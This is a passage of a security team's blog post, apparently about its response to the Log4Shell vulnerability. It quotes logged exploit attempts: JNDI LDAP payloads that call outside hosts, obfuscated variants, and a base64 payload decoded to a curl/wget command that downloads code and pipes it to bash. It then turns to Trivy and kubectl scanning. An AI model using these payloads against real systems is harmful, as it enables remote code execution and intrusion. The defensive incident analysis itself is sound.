2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We quickly then began to receive alerts of probing attempts across our environments.</p><p><img loading="lazy" src="/jp/assets/images/03-elastalert-b2d2c5d0c28cf3f09e30feb948e60320.png" width="1236" height="590" class="img_ev3q"></p><p>The following alerts are <strong>unsuccessful</strong> exploit attempts our infrastructure.</p><p>Let’s take a closer look at some of these exploit attempts to see if we can learn anything..</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">2021</span><span class="token plain">-12-10T14:05:52.612 Z</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;GET / HTTP/1.1&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">307</span><span class="token plain"> - </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> - </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;45.155.205.233&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">45.155.205.233</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">12344</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Basic</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Command</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Base64</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==}</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;34b61b2d-28f6-4e89-9baf-7cd3b4e71698&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;54.217.173.83:443&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;-&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This request was hitting our public API gateway with a base64 encoded payload. Decoding this payload we can see what the actor was trying to accomplish:</p><p>base64</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>base64 decoded</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">(curl -s 45.155.205.233:5874/54.217.173.83:443||wget -q -O- 45.155.205.233:5874/54.217.173.83:443)|bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If this attack was successful, we can see that the actor is attempting to download a malicious exploit first with <code>curl</code>, then attempt with <code>wget</code> and then execute with the downloaded payload with bash. If this attack was successful we would have received an alert from our Host-based Intrusion Detection System (HIDs) from <a href="https://github.com/falcosecurity/falco" target="_blank" rel="noopener noreferrer">Falco</a>. In addition, it shows the importance of ensuring our images are distroless, without bash and OS dependencies, and blocking egress network traffic if possible, as this would also prevent such an attack.</p><p>Looking at more attempts, we started to see probing attempts using a 3rd party service using <a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noopener noreferrer">Interactsh</a>.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token number" style="color:rgb(247, 140, 108)">16</span><span class="token plain">/Dec/2021:06:11:07 +0000</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;GET /?x=</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com/a} HTTP/1.1&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">302</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">l}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">a}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">p}</span><span class="token string" style="color:rgb(195, 232, 141)">://</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">j}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">n}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">i}</span><span class="token string" style="color:rgb(195, 232, 141)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">l}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">a}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">p}</span><span class="token string" style="color:rgb(195, 232, 141)">://</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">685</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.015</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">products-developer-portal-8080</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100.98</span><span class="token plain">.133.224:8080 </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.014</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">302</span><span class="token plain"> 548d1132926fa0bc9904e12523d2f250 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">l}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">d}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">a}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">p}</span><span class="token plain">://</span><span class="token variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token plain">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">, </span><span class="token number" style="color:rgb(247, 140, 108)">173.249</span><span class="token plain">.19.100</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We see a lot of requests calling DNS as a mechanism to detect if a system is vulnerable.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">2021</span><span class="token plain">-12-14T22:57:36.722Z</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;GET / HTTP/1.1&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">307</span><span class="token plain"> - </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> - </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;51.105.55.17&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;/</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">45.83.193.150</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">1389</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Exploit}</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;7c9223d6-2c81-491d-8564-10742cc90a9c&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;54.75.196.220&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;-&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In our Tokyo region, we started to see a lot of requests from <code>x00.it</code> domain.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">14</span><span class="token plain">/Dec/2021:17:37:59 +0000</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_id.log4jdns.x00.it%2F%7D&amp;page=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_page.log4jdns.x00.it%2F%7D&amp;search=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_search.log4jdns.x00.it%2F%7D HTTP/1.1&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">401</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">39</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">divd-0c1679670abeeb68eeabd98981713eea_${date</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">YYYYMMddHHmmss}</span><span class="token string" style="color:rgb(195, 232, 141)">_https_Referer.log4jdns.x00.it/}&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">divd-0c1679670abeeb68eeabd98981713eea_${date</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">YYYYMMddHHmmss}</span><span class="token string" style="color:rgb(195, 232, 141)">_https_User-Agent.log4jdns.x00.it/}&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">4496</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.255</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">monitoring-mki-lab-grafana-80</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100.115</span><span class="token plain">.164.63:3000 </span><span class="token number" style="color:rgb(247, 140, 108)">39</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.001</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">401</span><span class="token plain"> d7fa702ee8cc73793707ca6720c57639 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">194.5</span><span class="token plain">.73.6</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In the coming weeks we will continue to monitor the probes across our public infrastructure to see how they evolve.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="monday">Monday<a href="#monday" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="docker-vulnerability-scans">Docker Vulnerability Scans<a href="#docker-vulnerability-scans" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h3><p>Next, we wanted to ensure there was not an application running in our Kubernetes clusters with a vulnerable version of Log4j. We know from <a href="https://github.com/cisagov/log4j-affected-db" target="_blank" rel="noopener noreferrer">this resource</a> that there are many open source applications that are vulnerable. To ensure we are not running a tool that is vulnerable, we used Kubernetes API with <a href="https://github.com/kubernetes/kubectl" target="_blank" rel="noopener noreferrer">kubectl</a> and <a href="https://github.com/aquasecurity/trivy" target="_blank" rel="noopener noreferrer">Trivy</a>, a scanner for vulnerabilities in container images.</p><p>First, we built a small POC to ensure that Trivy can identify the CVE-2021-44228.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">❯❯❯ brew </span><span class="token function" style="color:rgb(130, 170, 255)">install</span><span class="token plain"> aquasecurity/trivy/trivy</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">❯❯❯ trivy image birdyman/log4j2-demo:1.0.0-12 </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">grep</span><span class="token plain"> CVE-2021-44228</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> org.apache.logging.log4j:log4j-api                     </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> CVE-2021-44228   </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> CRITICAL </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2.10</span><span class="token plain">.0            </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2.15</span><span class="token plain">.0                         </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> Remote code injection </span><span class="token keyword" style="font-style:italic">in</span><span class="token plain"> Log4j                                                  </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now that we know Trivy works, let’s create a small bash script to call Kubectl and Trivy and grep for the Log4j CVE.</p><p><code>trivy-scan-cve.sh CVE-2021-44228</code></p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token shebang important">#!/usr/bin/env bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">VULN</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;Scanning </span><span class="token string variable" style="color:rgb(191, 199, 213)">$1</span><span class="token string" style="color:rgb(195, 232, 141)">...&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">imgs</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token variable" style="color:rgb(191, 199, 213)">kubectl get pods -A -o </span><span class="token variable assign-left variable" style="color:rgb(191, 199, 213)">jsonpath</span><span class="token variable operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable string" style="color:rgb(195, 232, 141)">&#x27;{range .items[*]}{.spec.containers[*].image}{&quot; &quot;}&#x27;</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable operator" style="color:rgb(137, 221, 255)">|</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable function" style="color:rgb(130, 170, 255)">tr</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable string" style="color:rgb(195, 232, 141)">&quot; &quot;</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token variable string entity" style="color:rgb(195, 232, 141)">\n</span><span class="token variable string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable operator" style="color:rgb(137, 221, 255)">|</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable function" style="color:rgb(130, 170, 255)">sort</span><span class="token variable" style="color:rgb(191, 199, 213)"> -u</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:rgb(191, 199, 213)">img</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">in</span><span class="token plain"> </span><span class="token variable" style="color:rgb(191, 199, 213)">${imgs}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;scanning </span><span class="token string variable" style="color:rgb(191, 199, 213)">${img}</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  